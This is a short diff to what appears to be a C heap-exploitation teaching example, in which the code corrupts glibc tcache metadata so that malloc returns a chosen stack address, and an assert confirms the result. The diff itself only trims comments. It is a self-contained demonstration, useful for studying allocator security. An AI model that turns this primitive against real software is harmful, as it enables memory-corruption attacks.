@@ -49,21 +49,16 @@ struct tcache_metadata {
 int main() {
   uint64_t stack_target = 0x1337;
   
-  // Allocate a chunk to find the heap base
   uint64_t *victim = malloc(0x10);
   
-  // Calculate the base of the tcache metadata
-  // It's the first chunk on the heap
   long metadata_size = sizeof(struct tcache_metadata);
   struct tcache_metadata *metadata =
       (struct tcache_metadata *)((long)victim - 0x10 - metadata_size);
 
-  // VULNERABILITY: Overwriting metadata
-  // We insert our target address into the 0x20 bin (index 1)
+  // VULNERABILITY: Corrupt tcache metadata
   metadata->counts[1] = 1;
   metadata->entries[1] = &stack_target;
 
-  // The next malloc(0x20) returns the stack target immediately
   uint64_t *evil = malloc(0x20);
   
   assert(evil == &stack_target);
